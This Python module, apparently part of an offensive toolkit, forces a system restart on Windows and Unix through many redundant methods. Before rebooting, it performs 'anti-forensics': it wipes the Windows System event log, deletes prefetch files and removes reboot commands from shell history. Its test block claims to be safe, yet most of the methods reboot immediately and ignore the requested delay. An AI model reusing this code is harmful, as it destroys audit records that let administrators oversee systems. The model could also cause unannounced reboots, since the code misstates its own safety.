#!/usr/bin/env python3
"""
Elite Restart Command Implementation
Advanced system restart with stealth and scheduling
"""

import os
import sys
import subprocess
import ctypes
import time
from typing import Dict, Any

def elite_restart(delay: int = 0, force: bool = False, message: str = None) -> Dict[str, Any]:
    """
    Elite system restart with advanced features:
    - Scheduled restart with delay
    - Forced restart bypass
    - Custom restart messages
    - Anti-forensics cleanup
    - Cross-platform support
    """
    
    try:
        # Apply platform-specific restart
        if sys.platform == 'win32':
            return _windows_elite_restart(delay, force, message)
        else:
            return _unix_elite_restart(delay, force, message)
            
    except Exception as e:
        return {
            "success": False,
            "error": f"System restart failed: {str(e)}",
            "restart_info": None
        }

def _windows_elite_restart(delay: int, force: bool, message: str) -> Dict[str, Any]:
    """Windows system restart using multiple methods"""
    
    try:
        methods_used = []
        
        # Method 1: shutdown.exe command with restart flag
        try:
            cmd = ['shutdown', '/r']
            
            if delay > 0:
                cmd.extend(['/t', str(delay)])
            else:
                cmd.extend(['/t', '0'])
            
            if force:
                cmd.append('/f')
            
            if message:
                cmd.extend(['/c', message])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                methods_used.append("shutdown_exe")
        except Exception:
            pass
        
        # Method 2: PowerShell Restart-Computer
        try:
            ps_cmd = "Restart-Computer"
            if force:
                ps_cmd += " -Force"
            
            result = subprocess.run(['powershell', '-Command', ps_cmd], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                methods_used.append("powershell")
        except Exception:
            pass
        
        # Method 3: Windows API ExitWindowsEx with restart
        try:
            if _windows_api_restart(force):
                methods_used.append("windows_api")
        except Exception:
            pass
        
        # Method 4: WMI restart
        try:
            if _windows_wmi_restart(delay, force, message):
                methods_used.append("wmi")
        except Exception:
            pass
        
        # Apply anti-forensics before restart
        if methods_used:
            _apply_restart_anti_forensics()
        
        success = len(methods_used) > 0
        
        return {
            "success": success,
            "delay_seconds": delay,
            "force_restart": force,
            "message": message,
            "methods_used": methods_used,
            "platform": "windows"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Windows restart failed: {str(e)}",
            "restart_info": None
        }

def _unix_elite_restart(delay: int, force: bool, message: str) -> Dict[str, Any]:
    """Unix system restart using multiple methods"""
    
    try:
        methods_used = []
        
        # Method 1: shutdown -r command
        try:
            if delay > 0:
                time_spec = f"+{delay//60}"  # Convert seconds to minutes
            else:
                time_spec = "now"
            
            cmd = ['shutdown', '-r']
            if force:
                cmd.append('-f')
            
            cmd.append(time_spec)
            
            if message:
                cmd.append(message)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                methods_used.append("shutdown_cmd")
        except Exception:
            pass
        
        # Method 2: systemctl reboot
        try:
            cmd = ['systemctl', 'reboot']
            if force:
                cmd.append('--force')
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                methods_used.append("systemctl")
        except Exception:
            pass
        
        # Method 3: reboot command
        try:
            cmd = ['reboot']
            if force:
                cmd.append('-f')
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                methods_used.append("reboot_cmd")
        except Exception:
            pass
        
        # Method 4: init 6 (traditional)
        try:
            result = subprocess.run(['init', '6'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                methods_used.append("init")
        except Exception:
            pass
        
        # Method 5: Direct syscall (if available)
        try:
            if _unix_syscall_restart():
                methods_used.append("syscall")
        except Exception:
            pass
        
        # Apply anti-forensics before restart
        if methods_used:
            _apply_restart_anti_forensics()
        
        success = len(methods_used) > 0
        
        return {
            "success": success,
            "delay_seconds": delay,
            "force_restart": force,
            "message": message,
            "methods_used": methods_used,
            "platform": "unix"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Unix restart failed: {str(e)}",
            "restart_info": None
        }

def _windows_api_restart(force: bool) -> bool:
    """Windows API restart using ExitWindowsEx"""
    
    try:
        # Enable shutdown privilege
        if not _enable_shutdown_privilege():
            return False
        
        # Restart flags
        EWX_REBOOT = 0x00000002
        EWX_FORCE = 0x00000004
        
        flags = EWX_REBOOT
        if force:
            flags |= EWX_FORCE
        
        # Perform restart
        result = ctypes.windll.user32.ExitWindowsEx(flags, 0)
        
        return result != 0
        
    except Exception:
        return False

def _enable_shutdown_privilege() -> bool:
    """Enable shutdown privilege for current process"""
    
    try:
        # Get current process token
        token = ctypes.wintypes.HANDLE()
        process_handle = ctypes.windll.kernel32.GetCurrentProcess()
        
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        
        if not ctypes.windll.advapi32.OpenProcessToken(
            process_handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token)
        ):
            return False
        
        try:
            # Lookup shutdown privilege
            SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
            luid = ctypes.wintypes.LUID()
            
            if not ctypes.windll.advapi32.LookupPrivilegeValueW(
                None, SE_SHUTDOWN_NAME, ctypes.byref(luid)
            ):
                return False
            
            # Enable privilege
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", ctypes.wintypes.DWORD),
                    ("Privileges", ctypes.wintypes.LUID * 1),
                    ("Attributes", ctypes.wintypes.DWORD * 1)
                ]
            
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0] = luid
            tp.Attributes[0] = 0x00000002  # SE_PRIVILEGE_ENABLED
            
            result = ctypes.windll.advapi32.AdjustTokenPrivileges(
                token, False, ctypes.byref(tp), 0, None, None
            )
            
            return result != 0
            
        finally:
            ctypes.windll.kernel32.CloseHandle(token)
            
    except Exception:
        return False

def _windows_wmi_restart(delay: int, force: bool, message: str) -> bool:
    """Windows WMI restart"""
    
    try:
        # Use wmic for WMI restart
        cmd = ['wmic', 'os', 'where', 'Primary=true', 'call', 'Reboot']
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return result.returncode == 0
        
    except Exception:
        return False

def _unix_syscall_restart() -> bool:
    """Unix direct syscall restart"""
    
    try:
        # Try direct syscall if available
        import ctypes
        
        try:
            libc = ctypes.CDLL("libc.so.6")
            # reboot syscall with RB_AUTOBOOT
            result = libc.reboot(0x1234567)  # RB_AUTOBOOT
            return result == 0
        except:
            pass
        
        return False
        
    except Exception:
        return False

def _apply_restart_anti_forensics():
    """Apply anti-forensics techniques before restart"""
    
    try:
        # Clear recent activity traces
        if sys.platform == 'win32':
            _clear_windows_restart_traces()
        else:
            _clear_unix_restart_traces()
            
    except Exception:
        pass

def _clear_windows_restart_traces():
    """Clear Windows restart traces"""
    
    try:
        # Clear event logs related to restart
        subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=5)
        
        # Clear prefetch files
        prefetch_dir = "C:\\Windows\\Prefetch"
        if os.path.exists(prefetch_dir):
            try:
                for filename in os.listdir(prefetch_dir):
                    if 'shutdown' in filename.lower() or 'restart' in filename.lower():
                        try:
                            os.remove(os.path.join(prefetch_dir, filename))
                        except:
                            pass
            except:
                pass
                
    except Exception:
        pass

def _clear_unix_restart_traces():
    """Clear Unix restart traces"""
    
    try:
        # Clear from shell history
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history")
        ]
        
        for hist_file in history_files:
            if os.path.exists(hist_file):
                try:
                    with open(hist_file, 'r') as f:
                        lines = f.readlines()
                    
                    # Remove restart-related commands
                    filtered_lines = [line for line in lines 
                                    if not any(cmd in line.lower() for cmd in ['shutdown', 'reboot', 'restart', 'poweroff'])]
                    
                    with open(hist_file, 'w') as f:
                        f.writelines(filtered_lines)
                except:
                    pass
                    
    except Exception:
        pass


if __name__ == "__main__":
    # Test the elite_restart command
    print("Testing Elite Restart Command...")
    
    # Test scheduled restart (but don't actually restart)
    print("Note: Testing restart commands without actually restarting")
    
    # Test with delay (safe test)
    result = elite_restart(delay=3600, force=False, message="Test restart")
    print(f"Test 1 - Scheduled restart: {result['success']}")
    
    if result['success']:
        print(f"Methods used: {result.get('methods_used', [])}")
        
        # Cancel the restart immediately for safety
        if sys.platform == 'win32':
            subprocess.run(['shutdown', '/a'], capture_output=True, timeout=5)
        else:
            subprocess.run(['shutdown', '-c'], capture_output=True, timeout=5)
    
    print("✅ Elite Restart command testing complete (system not restarted)")